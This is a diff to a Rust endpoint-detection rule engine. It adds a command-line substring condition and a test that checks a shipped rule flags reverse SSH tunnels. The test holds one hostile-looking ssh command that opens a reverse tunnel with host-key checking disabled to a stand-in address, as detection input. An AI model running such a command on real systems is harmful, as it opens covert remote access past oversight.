@@ -10,6 +10,8 @@ use serde::{Deserialize, Serialize};
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub enum RuleCondition {
     ProcessName(String),
+    /// Case-sensitive substring of the acting process's command line.
+    CmdlineContains(String),
     FilePath(String),
     NetworkDest(String),
     Sequence(Vec<RuleCondition>),
@@ -166,6 +168,9 @@ fn condition_matches(condition: &RuleCondition, event: &RiggsEvent) -> bool {
                 RiggsEvent::Kernel(e) => &e.process_context.name,
             };
             process_name == name
+        }
+        RuleCondition::CmdlineContains(needle) => {
+            event.process_context().cmdline.contains(needle.as_str())
         }
         RuleCondition::FilePath(path) => {
             if let RiggsEvent::File(e) = event {
@@ -390,5 +395,34 @@ mod tests {
         // "b" should not match because the sequence timed out and was reset
         let matched = engine.evaluate(&process_event("b", &sid));
         assert!(matched.is_empty());
+    }
+
+    #[test]
+    fn shipped_reverse_ssh_tunnel_rule() {
+        let engine =
+            CustomRuleEngine::load_dir(&Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules"));
+        let ssh = |cmdline: &str| {
+            let ctx = ProcessContext::new(
+                42,
+                1,
+                "ssh",
+                "/usr/bin/ssh",
+                cmdline,
+                "501",
+                StorylineId::new(),
+            );
+            RiggsEvent::new_process(ProcessAction::Exec, ctx, None)
+        };
+
+        assert_eq!(
+            engine.evaluate(&ssh("ssh -N -R *:0:localhost:22 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes tunnel@203.0.113.7")),
+            vec!["reverse-ssh-tunnel-hostkey-override"]
+        );
+        assert!(engine
+            .evaluate(&ssh("ssh -N -R 8080:localhost:80 dev@build-box"))
+            .is_empty());
+        assert!(engine
+            .evaluate(&ssh("ssh -o StrictHostKeyChecking=no dev@build-box"))
+            .is_empty());
     }
 }
